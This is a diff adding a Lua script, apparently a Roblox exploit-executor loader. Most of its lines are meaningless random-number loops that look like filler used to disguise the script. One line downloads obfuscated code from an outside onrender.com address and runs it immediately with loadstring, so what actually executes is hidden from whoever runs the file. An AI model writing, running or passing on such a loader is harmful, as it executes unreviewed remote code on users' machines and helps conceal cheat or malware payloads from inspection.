@@ -1,0 +1,22 @@
+local DYHUB_A1 = math.random(1000,9999)
+local DYHUB_A2 = tostring(os.clock() * DYHUB_A1)
+
+local function DYHUB_B1(x) return (x * 3.141592653) / 7.25 end
+local function DYHUB_B2(s) return string.reverse(s or tostring(DYHUB_A1)) end
+local function DYHUB_B3(t) for i=1,#t do t[i]=tostring(t[i])..DYHUB_A2 end return t end
+
+for DYHUB_C1=1,25 do local DYHUB_C2=DYHUB_B1(DYHUB_C1)*math.random() if DYHUB_C2>999999 then DYHUB_C2=DYHUB_C2/math.pi end end
+local DYHUB_X1,DYHUB_X2,DYHUB_X3=math.random(1,9),{},{}
+for i=1,math.random(10,30) do table.insert(DYHUB_X2,math.random()) end
+for i=1,#DYHUB_X2 do DYHUB_X3[i]=(DYHUB_X2[i]*DYHUB_X1)..DYHUB_A2 end
+for _=1,10 do DYHUB_B2(tostring(DYHUB_X3[math.random(1,#DYHUB_X3)])) end
+
+getgenv().SaveKey = getgenv().SaveKey or false
+
+local DYHUB_L1 = {"alpha","bravo","charlie","delta","echo","foxtrot"}
+DYHUB_B2(DYHUB_L1[math.random(1,#DYHUB_L1)])
+loadstring(game:HttpGet("https://luashield-vr4g.onrender.com/api/raw/7247a1a8-88e0-4b3a-b98b-939a9e483095/obfuscated"))()
+
+for DYHUB_Z1=1,40 do local DYHUB_Z2=(DYHUB_A1+DYHUB_Z1)*math.random(100,999) DYHUB_Z2=DYHUB_Z2/(math.random()+0.01) end
+for _=1,15 do local DYHUB_F1=math.random(1,999999)/math.random(1,9999) if DYHUB_F1>5000 then DYHUB_F1=DYHUB_F1-math.random() end end
+for _=1,20 do local DYHUB_R1,DYHUB_R2=math.random(),math.random() local DYHUB_R3=DYHUB_R1*DYHUB_R2 if DYHUB_R3>0.5 then DYHUB_R3=DYHUB_R3/DYHUB_X1 end end
